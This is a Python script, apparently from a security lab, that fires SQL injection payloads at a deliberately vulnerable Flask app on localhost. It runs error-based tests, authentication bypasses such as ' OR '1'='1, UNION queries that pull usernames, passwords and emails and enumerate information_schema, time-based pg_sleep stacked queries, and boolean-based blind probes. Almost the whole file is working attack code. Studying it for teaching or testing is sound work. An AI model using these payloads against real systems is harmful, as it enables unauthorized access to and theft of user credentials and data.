#!/usr/bin/env python
"""
test_sqli.py - Automated SQL injection testing script
This script demonstrates different types of SQL injection attacks
"""
import requests
import time
import sys

BASE_URL = "http://localhost:5000/user"

def print_banner(title):
    """Print a formatted banner for each test"""
    print("\n" + "=" * 60)
    print(f" {title} ".center(60, "*"))
    print("=" * 60)

def send_request(payload):
    """Send a request with the given payload and return the response"""
    url = f"{BASE_URL}?id={payload}"
    print(f"[+] Testing URL: {url}")

    start_time = time.time()
    response = requests.get(url)
    elapsed_time = time.time() - start_time

    print(f"[+] Response status: {response.status_code}")
    print(f"[+] Response time: {elapsed_time:.2f} seconds")
    return response.text, elapsed_time

def test_normal_input():
    """Test with a normal, non-malicious input"""
    print_banner("NORMAL INPUT TEST")
    payload = "1"
    print(f"[+] Payload: {payload}")
    response, _ = send_request(payload)

    if "No user found" not in response and "Error" not in response:
        print("[+] SUCCESS: Normal request returned user data")
        print("[+] Sample response data:")
        # Extract and print a snippet of the response
        start_idx = response.find("ID:")
        if start_idx != -1:
            end_idx = response.find("<br>", start_idx) + 4
            print(response[start_idx:end_idx])
    else:
        print("[-] FAILED: Normal request did not return expected data")

def test_error_based_sqli():
    """Test error-based SQL injection"""
    print_banner("ERROR-BASED SQL INJECTION")
    payloads = [
        "1'",                  # Basic syntax error
        "1 AND 1=2",           # Logic error (should return no results)
        "1 AND 1=1",           # Logic validation (should return results)
        "1' OR '1'='1",        # Authentication bypass
        "1 OR 1=1",            # Another authentication bypass
        "1' AND (SELECT 1 FROM non_existent_table)='1"  # Force database error
    ]

    for payload in payloads:
        print(f"\n[+] Payload: {payload}")
        response, _ = send_request(payload)

        if "Error" in response:
            print("[+] SQL Error detected!")
            # Extract and print the error message
            start_idx = response.find("<pre>") + 5
            end_idx = response.find("</pre>", start_idx)
            if start_idx != -1 and end_idx != -1:
                error_msg = response[start_idx:end_idx]
                print(f"[+] Error message: {error_msg}")
        elif "No user found" in response:
            print("[+] Query returned no results (potential logical error injection)")
        else:
            print("[+] Query returned data (potential bypass successful)")

def test_union_based_sqli():
    """Test UNION-based SQL injection"""
    print_banner("UNION-BASED SQL INJECTION")
    payloads = [
        "1 ORDER BY 1",                # Check number of columns (should work)
        "1 ORDER BY 10",               # Check number of columns (should fail)
        "1 UNION SELECT 1,2,3",        # Basic UNION injection
        "0 UNION SELECT username, password, email FROM users",  # Extract sensitive data
        "0 UNION SELECT table_name, table_schema, 3 FROM information_schema.tables",  # Extract schema info
        "0 UNION SELECT column_name, data_type, table_name FROM information_schema.columns WHERE table_name='users'" # Extract column info
    ]

    for payload in payloads:
        print(f"\n[+] Payload: {payload}")
        response, _ = send_request(payload)

        if "Error" in response:
            print("[-] Query failed with error")
        elif "No user found" in response:
            print("[-] No data returned")
        else:
            print("[+] Data extracted successfully!")
            # Try to extract some of the returned data
            if "Username:" in response or "password" in response.lower():
                print("[+] Potentially sensitive data found in the response!")

def test_time_based_sqli():
    """Test time-based blind SQL injection"""
    print_banner("TIME-BASED BLIND SQL INJECTION")

    print("[+] Testing normal request for baseline...")
    _, normal_time = send_request("1")

    # Test with increasing delay times
    delay_payloads = [
        ("1; SELECT pg_sleep(1)--", 1),  # 1-second delay
        ("1; SELECT pg_sleep(2)--", 2),  # 2-second delay
        ("1; SELECT pg_sleep(3)--", 3),  # 3-second delay
    ]

    for payload, expected_delay in delay_payloads:
        print(f"\n[+] Payload: {payload}")
        print(f"[+] Expected delay: ~{expected_delay} seconds")

        _, elapsed_time = send_request(payload)

        if elapsed_time >= expected_delay:
            print(f"[+] SUCCESS: Time-based injection confirmed! Response delayed by {elapsed_time:.2f} seconds")
        else:
            print(f"[-] FAILED: Response time ({elapsed_time:.2f}s) not significantly delayed")

def test_boolean_based_sqli():
    """Test boolean-based blind SQL injection"""
    print_banner("BOOLEAN-BASED BLIND SQL INJECTION")

    true_conditions = [
        "1 AND 1=1",
        "1 AND 'a'='a'",
        "1 AND (SELECT count(*) FROM users) > 0"
    ]

    false_conditions = [
        "1 AND 1=2",
        "1 AND 'a'='b'",
        "1 AND (SELECT count(*) FROM users) < 0"
    ]

    print("[+] Testing TRUE conditions (should return data):")
    for payload in true_conditions:
        print(f"\n[+] Payload: {payload}")
        response, _ = send_request(payload)

        if "No user found" not in response and "Error" not in response:
            print("[+] SUCCESS: Condition evaluated as TRUE, data returned")
        else:
            print("[-] FAILED: No data returned for TRUE condition")

    print("\n[+] Testing FALSE conditions (should NOT return data):")
    for payload in false_conditions:
        print(f"\n[+] Payload: {payload}")
        response, _ = send_request(payload)

        if "No user found" in response or "ID:" not in response:
            print("[+] SUCCESS: Condition evaluated as FALSE, no data returned")
        else:
            print("[-] FAILED: Data returned for FALSE condition")

def main():
    print_banner("SQL INJECTION TESTING SCRIPT")
    print("This script will test various SQL injection techniques")
    print("Ensure your vulnerable Flask app is running on http://localhost:5000")

    input("Press Enter to start testing...")

    try:
        test_normal_input()
        test_error_based_sqli()
        test_union_based_sqli()
        test_time_based_sqli()
        test_boolean_based_sqli()

        print("\n" + "=" * 60)
        print(" TESTING COMPLETE ".center(60, "*"))
        print("=" * 60)

    except requests.exceptions.ConnectionError:
        print("\n[-] ERROR: Could not connect to the Flask application.")
        print("[-] Please ensure the Flask app is running on http://localhost:5000")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[-] Testing aborted by user.")
        sys.exit(0)

if __name__ == "__main__":
    main()
